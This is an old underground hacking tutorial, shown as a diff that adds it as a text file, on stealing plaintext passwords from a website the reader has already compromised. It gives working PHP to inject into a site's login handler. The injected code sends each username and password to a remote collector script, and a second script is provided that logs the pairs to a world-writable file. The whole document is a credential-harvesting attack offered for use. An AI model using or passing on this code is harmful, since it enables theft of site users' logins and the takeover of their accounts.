@@ -1,0 +1,65 @@
+---------------------------------------------------------------------------------------
+[+] Login Form Password Stealing - Tutorial
+[+] Author: Neutralise
+[+] Location: http://thesoftwareengineer.org/services/tuts/LoginFormPassStealing.txt
+
+---------------------------------------------------------------------------------------
+
+Intro:
+It seems that alot of people these days are gaining shell access, downloading a database
+then attempting to crack the hashes. If they are salted, sha1 or a hard to crack plain 
+ole' MD5, they start bitchin and moaning when they can't get the plain text. So here it 
+is, a tutorial on how to get user:pass format in plain text of ANY hash type.
+
+Method:
+Modify the login form of a site to catch the password remotely, before it is encrypted. I
+will explain this more simply via an example.
+
+Take the following login form for example,
+<form method="post" action="cookies.php"><hr />
+<p>User: <input type="text" class="buttonstyle" name="username"></p>
+<p>Pass: <input type="password" class="buttonstyle" name="password"></p>
+<p><input type="submit" value="Login" class="buttonstyle" name="submit"> 
+<input type="reset" value="Reset" class="buttonstyle" /></p>
+</form>
+
+Now we can see that the action of this form points to 'cookies.php'. Now cookies.php
+will probably include a function similar to this depending on the encryption type, etc.
+$user = $_POST['username'];
+$pass = $_POST['password'];
+if(md5($user) == $usermd5 && md5($pass) == $passmd5){
+setcookie("Whatever", $cookie, time()+3600, "/");
+header("Location: index.php");
+die();
+}
+
+Now on to bypassing the encryption before it happens, thus gaining the username and 
+password in plain text we need to edit the 'cookie.php' site, add the following code at 
+the start of the php tags.
+<?php
+$user = $_POST['username'];
+$pass = $_POST['password'];
+file_get_contents("http://site.com/plain.php?user=".$user."&pass=".$pass."");
+?>
+
+Now the php file 'plain.php' will include the following code:
+<?php
+$user = $_GET['user'];
+$pass = $_GET['pass'];
+$file = "lol.txt";
+$fp = fopen($file, "a");
+fputs($fp, "$user:$pass\n");
+fclose($fp);
+?>
+
+Notice you will also need to upload a file 'lol.txt', and chmod it to 777.
+
+Conclusion:
+Now everytime a user logs into the site you are editing the code of, it will send the 
+username and password to the 'plain.php' text file and save it in 'log.txt', on a remote
+server in theformat of:
+user:pass
+
+---------------------------------------------------------------------------------------
+[+]^Neutralised.
+---------------------------------------------------------------------------------------
